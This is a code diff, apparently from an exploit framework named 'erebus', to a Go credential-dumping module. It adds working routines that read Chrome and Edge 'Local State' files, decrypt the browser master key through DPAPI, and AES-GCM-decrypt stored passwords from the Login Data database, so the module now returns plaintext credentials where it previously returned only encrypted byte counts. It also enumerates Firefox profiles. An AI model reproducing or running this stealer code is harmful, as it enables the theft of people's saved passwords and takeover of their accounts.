@@ -4,10 +4,15 @@ package creds
 
 import (
 	"context"
+	"crypto/aes"
+	"crypto/cipher"
 	"database/sql"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	_ "modernc.org/sqlite"
@@ -16,7 +21,6 @@ import (
 func dumpBrowser(_ context.Context, _ *pb.CredDumpConfig) (*pb.CredDumpResult, error) {
 	var creds []*pb.Credential
 
-	// Chrome/Edge credential paths
 	localAppData := os.Getenv("LOCALAPPDATA")
 	appData := os.Getenv("APPDATA")
 
@@ -36,7 +40,6 @@ func dumpBrowser(_ context.Context, _ *pb.CredDumpConfig) (*pb.CredDumpResult, e
 		}
 	}
 
-	// Firefox
 	firefoxProfiles := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
 	entries, err := os.ReadDir(firefoxProfiles)
 	if err == nil {
@@ -72,7 +75,12 @@ func extractChromiumCreds(browser, dbPath string) ([]*pb.Credential, error) {
 		return nil, err
 	}
 
-	// Copy DB to temp to avoid locking issues
+	userDataDir := filepath.Dir(filepath.Dir(dbPath))
+	masterKey, err := chromiumMasterKey(userDataDir)
+	if err != nil {
+		masterKey = nil
+	}
+
 	tmpFile, err := os.CreateTemp("", "logindata-*.db")
 	if err != nil {
 		return nil, err
@@ -85,7 +93,9 @@ func extractChromiumCreds(browser, dbPath string) ([]*pb.Credential, error) {
 	if err != nil {
 		return nil, err
 	}
-	os.WriteFile(tmpPath, data, 0600)
+	if err := os.WriteFile(tmpPath, data, 0600); err != nil {
+		return nil, err
+	}
 
 	db, err := sql.Open("sqlite", tmpPath)
 	if err != nil {
@@ -107,14 +117,84 @@ func extractChromiumCreds(browser, dbPath string) ([]*pb.Credential, error) {
 			continue
 		}
 
+		password, err := decryptChromiumPassword(encPassword, masterKey)
+		if err != nil {
+			password = fmt.Sprintf("<decrypt failed: %v>", err)
+		}
+
 		creds = append(creds, &pb.Credential{
 			Type:     "browser_password",
 			Source:   browser,
 			Username: username,
 			Domain:   url,
-			Value:    fmt.Sprintf("encrypted(%d bytes) - decrypt with DPAPI key", len(encPassword)),
+			Value:    password,
 		})
 	}
 
 	return creds, nil
+}
+
+func chromiumMasterKey(userDataDir string) ([]byte, error) {
+	localStatePath := filepath.Join(userDataDir, "Local State")
+	raw, err := os.ReadFile(localStatePath)
+	if err != nil {
+		return nil, err
+	}
+
+	var state struct {
+		OsCrypt struct {
+			EncryptedKey string `json:"encrypted_key"`
+		} `json:"os_crypt"`
+	}
+	if err := json.Unmarshal(raw, &state); err != nil {
+		return nil, err
+	}
+	if state.OsCrypt.EncryptedKey == "" {
+		return nil, fmt.Errorf("no encrypted_key in Local State")
+	}
+
+	encKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
+	if err != nil {
+		return nil, err
+	}
+	if len(encKey) > 5 && strings.HasPrefix(string(encKey[:5]), "DPAPI") {
+		encKey = encKey[5:]
+	}
+	return dpAPIDecrypt(encKey)
+}
+
+func decryptChromiumPassword(enc []byte, masterKey []byte) (string, error) {
+	if len(enc) == 0 {
+		return "", fmt.Errorf("empty ciphertext")
+	}
+
+	if len(enc) >= 3 && (string(enc[:3]) == "v10" || string(enc[:3]) == "v11") {
+		if len(masterKey) == 0 {
+			return "", fmt.Errorf("master key required for v10/v11 password")
+		}
+		if len(enc) < 15 {
+			return "", fmt.Errorf("ciphertext too short")
+		}
+		nonce := enc[3:15]
+		ciphertext := enc[15:]
+		block, err := aes.NewCipher(masterKey)
+		if err != nil {
+			return "", err
+		}
+		gcm, err := cipher.NewGCM(block)
+		if err != nil {
+			return "", err
+		}
+		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
+		if err != nil {
+			return "", err
+		}
+		return string(plain), nil
+	}
+
+	plain, err := dpAPIDecrypt(enc)
+	if err != nil {
+		return "", err
+	}
+	return string(plain), nil
 }
